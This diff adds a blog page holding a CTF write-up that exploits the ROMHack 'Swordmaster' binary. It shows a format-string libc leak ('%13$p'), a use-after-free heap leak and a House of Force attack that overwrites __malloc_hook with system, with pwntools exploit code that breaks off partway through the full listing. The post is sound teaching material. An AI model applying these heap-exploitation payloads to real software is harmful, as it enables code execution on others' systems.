@@ -1,0 +1,502 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Stig's Lab Notes | UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</title>
+  <meta name="description" content="A format string leak, a UAF heap leak, and a House of Force attack to pop a shell in the ROMHack CTF Swordmaster pwn challenge.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://stigward.github.io/posts/swordmaster-pwn-chal/">
+  <meta property="og:description" content="A format string leak, a UAF heap leak, and a House of Force attack to pop a shell in the ROMHack CTF Swordmaster pwn challenge.">
+  <meta property="og:site_name" content="Stig's Lab Notes">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://stigward.github.io/posts/swordmaster-pwn-chal/">
+  <meta name="twitter:title" content="UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge">
+  <meta name="twitter:description" content="A format string leak, a UAF heap leak, and a House of Force attack to pop a shell in the ROMHack CTF Swordmaster pwn challenge.">
+
+  
+    <meta property="og:image" content="https://stigward.github.io/assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
+    <meta name="twitter:image" content="https://stigward.github.io/assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
+  
+
+  <link href="https://stigward.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Stig's Lab Notes Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-11327753546b2135c989eee5cd83497a2734b702928d016839d795f6c706e3d5.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-c3423cb8f8dc5b46f03bebdb004bc5d65fb395e4743a83975c4a75e75300a1ca.css" integrity="sha256-w0I8uPjcW0bwO+vbAEvF1l+zleR0OoOXXEp151MAoco=" crossorigin="anonymous">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Stig's Lab Notes">Stig's Lab Notes</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/_stigward" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/stigward" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:stigward.research@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
+  <use href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss" xlink:href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+  </ul>
+</nav>
+
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</h1>
+            <p>A format string leak, a UAF heap leak, and a House of Force attack to pop a shell in the ROMHack CTF Swordmaster pwn challenge.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    September 25, 2022
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      14 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/pwn" title="See all posts with tag 'Pwn'">Pwn</a>
+    
+      
+      <a href="/tag/ctf" title="See all posts with tag 'CTF'">CTF</a>
+    
+      
+      <a href="/tag/heap" title="See all posts with tag 'Heap'">Heap</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <h1 id="swordmaster-pwn-challenge">Swordmaster Pwn Challenge</h1>
+
+<h2 id="overview">Overview:</h2>
+<p>This challenge was part of the ROMHack CTF hosted on HackTheBox’s CTF platform. At the end of the 48 hour event, the challenge had roughly 10 solves. I was sadly not one of them, but did end up solving it Sunday night, a few hours after the CTF had concluded.</p>
+
+<p>For this challenge, the binary, <code class="highlighter-rouge">libc.so.6</code>  and <code class="highlighter-rouge">ld-linux-x86-64.so.2</code> were provided.</p>
+
+<h2 id="tldr">TL;DR:</h2>
+<p>Getting the flag for this challenge requires the exploitation of 3 bugs. First, we can leak the base address of <code class="highlighter-rouge">libc</code> with a format string vulnerability. Next, we can obtain the base address of the heap with a Use-After-Free (UAF) vulnerability. Finally, we can corrupt the top chunk of the heap’s metadata, allowing us to execute a “House Of Force” attack, overwriting <code class="highlighter-rouge">__malloc_hook</code> with <code class="highlighter-rouge">system</code> and obtaining a shell.</p>
+
+<h2 id="recon---functionality-and-re">Recon - Functionality and RE:</h2>
+<h3 id="binary-walkthrough">Binary Walkthrough:</h3>
+
+<p>When we first run the challenge binary, we are asked to input our name and choose our class. After that, we are shown the menu, where we can conduct a number of actions. 
+<img src="/assets/img/img_swordmaster/binary_startup_and_menu.png" alt="startup menu" />
+We will talk about each menu option and it’s underlying implementation as it becomes relevant to exploitation.
+For now, let’s jump into Ghidra and see if we can find any vulnerabilities.</p>
+
+<h3 id="reversing">Reversing:</h3>
+<h4 id="player-struct">Player struct</h4>
+<p>Jumping into <code class="highlighter-rouge">main</code>, we first see that there is a global <code class="highlighter-rouge">player</code> structure. The program mallocs space for the player’s name and class.</p>
+
+<p><img src="/assets/img/img_swordmaster/read_player_name.png" alt="read name" /></p>
+
+<p>Here we see the program reads <code class="highlighter-rouge">0x1f</code> bytes from <code class="highlighter-rouge">stdin</code> and assigns them to the first field in the player structure. Next, it takes in an integer and compares it in a big conditional statement.</p>
+
+<p><img src="/assets/img/img_swordmaster/setting_player_class.png" alt="set class" /></p>
+
+<p>I have included the <code class="highlighter-rouge">if</code> statement for if a player chooses the number 2. We can see it prints that the mage class was chosen and then writes “Mage” to the other field in the player object which was previously malloc’d. After the conditional block for the chosen class is completed, the <code class="highlighter-rouge">player_init</code> function is run with the player structure passed in as a parameter. I have gone ahead and renamed the fields for easy of readability:</p>
+
+<p><img src="/assets/img/img_swordmaster/player_struct.png" alt="player struct" /></p>
+
+<p>So, with this, we can assume that the global player struct looks something like the following:</p>
+<pre><code class="language-C">struct Player {
+	char *name;
+	int level;
+	int gold;
+	int attack;
+	int dex; 
+	int hp;
+	char *class;
+}
+</code></pre>
+<p>This can be confirmed by observing the player structure (named <code class="highlighter-rouge">pl</code>) in gdb after <code class="highlighter-rouge">player_init</code> is run:</p>
+
+<p><img src="/assets/img/img_swordmaster/player_struct_in_mem.png" alt="player struct" />
+If we translate this memory layout to the struct above will get a player with a name stored at <code class="highlighter-rouge">0x0000555555605270</code>, a level of 1, 69 (0x45) gold, 10 (0xa) attack, 20 (0x14) dex, 100 (0x64) hp, and a class string stored at <code class="highlighter-rouge">0x00005555556052a0</code>. Running <code class="highlighter-rouge">heap chunks</code>, we can see our name and class name on the heap at the expected memory addresses:
+<img src="/assets/img/img_swordmaster/heap_chunks_init.png" alt="heap init" /></p>
+
+<h4 id="menu-handler">Menu Handler:</h4>
+<p>Now that we know how the player struct is stored in memory, let’s take a look at the handler for the binary’s game menu.</p>
+
+<p><img src="/assets/img/img_swordmaster/menu_switch.png" alt="menu switch" />
+The program first checks to see if we still have enough remaining energy to execute. If our energy is out, the program returns. If we still have energy, the menu options are handled in a large switch statement based on the user input. We will talk more about each handler function as they become relevant to exploiting the challenge.</p>
+
+<h3 id="memory-protections-and-libc">Memory Protections and Libc:</h3>
+<p>Running <code class="highlighter-rouge">checksec</code>,  we can see what memory protections the binary has in place..spoiler alert, it’s basically all of them</p>
+
+<p><img src="/assets/img/img_swordmaster/check_sec.png" alt="checksec" /></p>
+
+<p>With Stack Canaries, NX, and PIE it’s unlikely we will be able to exploit a stack based vulnerability. Furthermore, full RELO makes the entire GOT read only, so we can’t use an arbitrary write to overwrite a GOT address. This means we will likely be dealing with a heap based attack. Taking a look at the <code class="highlighter-rouge">libc</code> provided, we can see it is version 2.27</p>
+
+<p><img src="/assets/img/img_swordmaster/glibc_version_running.png" alt="version glibc" /></p>
+
+<p>We can refer to the following chart (source: https://hackmag.com/coding/htb-ropetwo-uaf/) for valid heap based attacks by version of glibc:</p>
+
+<p><img src="/assets/img/img_swordmaster/glibc_version.png" alt="glibc verison" /></p>
+
+<h2 id="vulnerabilities">Vulnerabilities:</h2>
+<p>Now that we understand how the binary works, it’s time to discuss the vulnerabilities.</p>
+
+<h3 id="use-after-free">Use-After-Free:</h3>
+<p>The Use-after-free vuln was the first one I located, based strictly on the functionality of the binary. When we choose option 5 in the menu, we get a message stating <code class="highlighter-rouge">[!] Old class has been deleted and your stats will change! Feel free to choose another class!</code>. Taking a look at the <code class="highlighter-rouge">change_class</code> handler function below, we can confirm that first, <code class="highlighter-rouge">player-&gt;class</code> is assigned to a newly malloc’d pointer, and then that pointer is free’d.</p>
+
+<p><img src="/assets/img/img_swordmaster/uaf_static.png" alt="uaf static" /></p>
+
+<p>However, we know that menu option 3, “Show stats”, will read from the class pointer in the player struct. So what happens if we run option 3 after option 5?</p>
+
+<p><img src="/assets/img/img_swordmaster/UAF_in_class.png" alt="uaf shown" /></p>
+
+<p>As shown above, our “Class” now seems to contain garbage data instead of “Mage”.  Taking a look at program memory, we can see the player’s class pointer points to <code class="highlighter-rouge">0x555555605300</code>, which after being free’d now contains two little-endian hex values: <code class="highlighter-rouge">0x5555556052d0</code> and <code class="highlighter-rouge">0x555555604010</code>.</p>
+
+<p><img src="/assets/img/img_swordmaster/heap_struct_uaf.png" alt="heap struct" /></p>
+
+<blockquote class="prompt-info">
+  <p>The free’d chunks still show up in the heap chunks because of the tcache. Future posts will go into further details on the glibc internals.</p>
+</blockquote>
+
+<p>You may notice that these hex values are the address of the previous chunk and the address of the first chunk respectively, thus leaking the address of the heap. I spent a while on this bug seeing if there was any way to weaponize it more, but the leak is the only primative it gives us. This will be helpful to bypass ASLR, but we will need another bug (or two) in order to craft an exploit.</p>
+
+<h3 id="heap-metadata-corruption">Heap Metadata Corruption:</h3>
+<p>Our second bug is in the binary’s “Craft Sword” functionality, which is option 1 in the game menu.</p>
+
+<p><img src="/assets/img/img_swordmaster/sword_handler.png" alt="sword handler" /></p>
+
+<p>As shown above, the program reads our input and malloc’s that size, allowing us the ability to malloc arbitrary sizes through normal program interaction. Next, it asks us to input a 1, 2, or 3 to choose what we want to “empower our sword” with. However, notice that instead of using the <code class="highlighter-rouge">read_num()</code> function, a standard <code class="highlighter-rouge">read</code> is used. This means we can specify any data, and it will be read to our newly malloc’d memory. Furthermore, you will notice that <code class="highlighter-rouge">read</code> will actually read up to <code class="highlighter-rouge">__size + 8</code> data into our <code class="highlighter-rouge">__buf</code> pointer, meaning there is a 7-byte heap based buffer overflow. We can confirm this by providing a size for malloc, and then a data payload that is 7 bytes longer than the specified size.</p>
+
+<p><img src="/assets/img/img_swordmaster/heap_based_buffer_overflow.png" alt="BoF" /></p>
+
+<p>Now, observing our heap we see the following:</p>
+
+<p><img src="/assets/img/img_swordmaster/top_chunk_overwrite_mem.png" alt="top chunk overwrite" /></p>
+
+<p>We can see that our 7 byte overwrite affects the size of the top chunk in our program. Nice! This indicates we may be able to execute a <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force">House Of Force</a> attack. Normally, the top chunk’s size is the heap’s total allocated space minus the already allocated chunk sizes, bordering the end of the heap memory. With the overflow, we can now force malloc to return and thus overwrite arbitrary pointers in memory OUTSIDE of the heap’s memory space. However, due to ASLR, we don’t know where things outside of the heap memory are located, and thus we need another leak…</p>
+<h3 id="format-string">Format String:</h3>
+<p>Okay to be honest, this is where I got stuck while the CTF was still running and I felt a little silly afterwards. Thanks to the person in discord who was able to give me a small hint that pushed me in the right direction. 
+Back in our <code class="highlighter-rouge">main</code> function, when we are prompted to pick a class, there is an <code class="highlighter-rouge">else</code> block in the conditional that auto assigns us the <code class="highlighter-rouge">Tank</code> class if our option does not match any of the acceptable options.</p>
+
+<p><img src="/assets/img/img_swordmaster/format_string_static.png" alt="format string" /></p>
+
+<p>As shown above, there conditional starts with three <code class="highlighter-rouge">printf</code> statements which combine to print <code class="highlighter-rouge">"There is no &lt;USER INPUT&gt; class! You will follow the Tank path..."</code>. Notice the second <code class="highlighter-rouge">printf</code> puts our user input directly into the function, resulting in a classic <a href="https://owasp.org/www-community/attacks/Format_string_attack">format string vulnerability</a>. Taking a look at how <code class="highlighter-rouge">menu_choice_2</code> is set, we see that we are constrained to 6 characters:</p>
+
+<p><img src="/assets/img/img_swordmaster/menu_choice.png" alt="menu choices" /></p>
+
+<p>We can leverage this vulnerability to leak variables from the stack. Lets use <code class="highlighter-rouge">%p</code> as our payload and set a break point right before the 2nd print (<code class="highlighter-rouge">main+521</code>) function call. We are trying to leak an address from libc, so we also need to find where libc is loaded. We can do so with <code class="highlighter-rouge">info proc mappings</code>. This results in the following:</p>
+
+<p><img src="/assets/img/img_swordmaster/info_proc.png" alt="info proc" /></p>
+
+<p>We can see the base address for <code class="highlighter-rouge">libc</code> is <code class="highlighter-rouge">0x7ffff79e2000</code>. This will change on each run (outside of GDB) due to ASLR as described earlier.</p>
+
+<p>Dumping the stack with <code class="highlighter-rouge">x/50gx $rsp</code>, we can see there is one stack variable which is a pointer to somewhere in <code class="highlighter-rouge">libc</code>’s memory range.</p>
+
+<p><img src="/assets/img/img_swordmaster/libc_stack.png" alt="libc stack val" /></p>
+
+<p>Through a fairly boring and far-too-long manual process, I was able to determine the proper offset to leak this variable was 13.</p>
+
+<p><img src="/assets/img/img_swordmaster/proper_address_leaked.png" alt="libc leak" /></p>
+
+<p>Then to determine our base address, we need to subtract <code class="highlighter-rouge">0x21c87</code>:</p>
+
+<p><code class="highlighter-rouge">0x00007ffff7a03c87 - 0x21c87 = 0x7ffff79e2000 = libc base</code></p>
+
+<p>Nice, we now have everything we need to write an exploit!</p>
+
+<h2 id="exploit">Exploit:</h2>
+<p>When doing research on House of Force, I found a <a href="https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/">fantastic write-up</a> by Adam Force that explains a basic strategy to get RCE. The idea is to overwrite <code class="highlighter-rouge">__malloc_hook</code>, a function called before each malloc, with <code class="highlighter-rouge">system</code>, and pass it a pointer to <code class="highlighter-rouge">/bin/sh\0</code>. Therefore, our exploit will work as follows.</p>
+<ol>
+  <li>Set our name to <code class="highlighter-rouge">/bin/sh\0</code>, which will be stored on the heap at an address we know through our leaks</li>
+  <li>Trigger the format string vuln to leak libc base</li>
+  <li>Choose menu option 5 to trigger the UAF vuln and then choose option 3 to leak the heap address</li>
+  <li>Use the craft sword function to corrupt the top chunk size</li>
+  <li>Use the craft sword function to allocate a chunk up to the address of <code class="highlighter-rouge">__malloc_hook</code></li>
+  <li>Use the craft sword function to create chunk to overwrite <code class="highlighter-rouge">__malloc_hook</code> with the <code class="highlighter-rouge">system</code> address</li>
+  <li>Call craft sword one last time with a pointer to the name in our player object to get a shell.</li>
+</ol>
+
+<h3 id="step-one">Step One:</h3>
+<p>We will use pwntools for this exploit. First we need to set up the binary to run with the provided <code class="highlighter-rouge">glibc</code> and then send it our name.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./swordmaster"</span><span class="p">)</span>  
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./glibc/libc.so.6"</span><span class="p">)</span>  
+<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="s">'./glibc/ld-linux-x86-64.so.2'</span><span class="p">,</span><span class="s">'./swordmaster'</span><span class="p">],</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD\_PRELOAD"</span><span class="p">:</span><span class="s">"./glibc/libc.so.6"</span><span class="p">})</span>  
+  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="step-two">Step Two:</h3>
+<p>Next, we need to leak the libc address with the format string vulnerability. We can do so by waiting for the text prompt, sending <code class="highlighter-rouge">%13$p</code> as our class, and then parsing the address out of the received line. Lastly, we subtract <code class="highlighter-rouge">0x21c87</code> as described above and set <code class="highlighter-rouge">libc.address</code> accordingly. <code class="highlighter-rouge">pwntools</code> now knows the base address of libc and can load it’s symbols at the proper addresses.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'%13$p'</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'There is no '</span><span class="p">)</span>  
+  
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>  
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>  
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x21c87</span>
+</code></pre></div></div>
+
+<h3 id="step-3">Step 3:</h3>
+<p>Similar to the above step, we need to interact with the program to exploit the UAF bug and get our heap base address. We do so by sending <code class="highlighter-rouge">5</code> to delete our player’s class, and then sending <code class="highlighter-rouge">3</code> to display our stats. We can parse the received line and grab the leaked hex value, which we know from our previous recon will be the value of the previously allocated chunk. At this point in the program, the heap layout will always be the same, so we can use a static offset to get back to the heap base.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Class: '</span><span class="p">)</span>  
+  
+<span class="n">heap</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  
+<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4800</span> <span class="o">-</span> <span class="mh">0x10</span>
+</code></pre></div></div>
+
+<h3 id="step-4">Step 4:</h3>
+<p>Now it’s time to start the heap exploitation process. To make matters simpler, we can write a wrapper around the craft sword program interaction.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now we need to corrupt the top chunk size. We can do this programmatically the same way we did manually earlier:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">malloc</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x41</span><span class="s">'</span><span class="o">*</span><span class="mi">47</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Next, we want to malloc all the way up to just before <code class="highlighter-rouge">__malloc_hook</code>. We can do so by doing the following: 
+<code class="highlighter-rouge">__malloc_hook address - (heap base + already allocated space) - 0x10</code>. Looking at the current state of our heap at this point in the exploit, we see the following:</p>
+
+<p><img src="/assets/img/img_swordmaster/heap_mid_exploit.png" alt="heap mid exploit" /></p>
+
+<p>Adding all the allocated sizes together, we get <code class="highlighter-rouge">0x250 + 0x1010 + 0x30 + 0x30 + 0x30 + 0x30 = 0x1320</code>. We also need to add an additional <code class="highlighter-rouge">0x10</code> since we are using the heap base, which is <code class="highlighter-rouge">0x10</code> before the first chunk on the heap. Therefore we have the following code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">distance</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x1330</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span>  
+<span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="s">'dummy'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Note that we subtract <code class="highlighter-rouge">0x10</code> so that we get a pointer just before <code class="highlighter-rouge">__malloc_hook</code>. Therefore, on the next call to malloc, the allocator will return a pointer to <code class="highlighter-rouge">__malloc_hook</code>.</p>
+
+<h3 id="step-5">Step 5:</h3>
+<p>Almost there, we need to call malloc another time. The data we include in this call will overwrite the <code class="highlighter-rouge">__malloc_hook</code>. Therefore, we use the following code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h3 id="step-6">Step 6:</h3>
+<p>Last step, we need to get a pointer to our name, <code class="highlighter-rouge">/bin/sh\0</code>. This is always located <code class="highlighter-rouge">0x1270</code> from the heap base. Instead of providing a size when crafting a sword, we will provide this pointer. Now instead of <code class="highlighter-rouge">__malloc_hook</code> running before the malloc takes place, <code class="highlighter-rouge">system("/bin/sh\0")</code> will run resulting in a shell.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x1270</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h3 id="full-exploit-code">Full Exploit Code:</h3>
+<p>The full exploit is included below. You can also view it on my <a href="https://github.com/stigward/PoCs-and-Exploits/tree/main/CTFs/ROMHack2022/swordmaster">github</a>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  
+<span class="kn">import</span> <span class="nn">sys</span>  
+<span class="k">if</span> <span class="ow">not</span> <span class="n">sys</span><span class="p">.</span><span class="n">warnoptions</span><span class="p">:</span>  
+  <span class="kn">import</span> <span class="nn">warnings</span>  
+  <span class="n">warnings</span><span class="p">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s">"ignore"</span><span class="p">)</span>  
+  
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./swordmaster"</span><span class="p">)</span>  
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./glibc/libc.so.6"</span><span class="p">)</span>  
+<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="s">'./glibc/ld-linux-x86-64.so.2'</span><span class="p">,</span><span class="s">'./swordmaster'</span><span class="p">],</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD\_PRELOAD"</span><span class="p">:</span><span class="s">"./glibc/libc.so.6"</span><span class="p">})</span>  
+  
+<span class="c1"># ---- SET NAME ----  
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>  
+  
+<span class="c1"># ---- LEAK LIBC BASE WITH FORMAT STRING BUG ----  
+</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'%13$p'</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'There is no '</span><span class="p">)</span>  
+  
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>  
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>  
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x21c87</span>  
+  
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAKED LIBC BASE: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>  
+  
+  
+<span class="c1"># ---- LEAK HEAP BASE WITH UAF BUG -------  
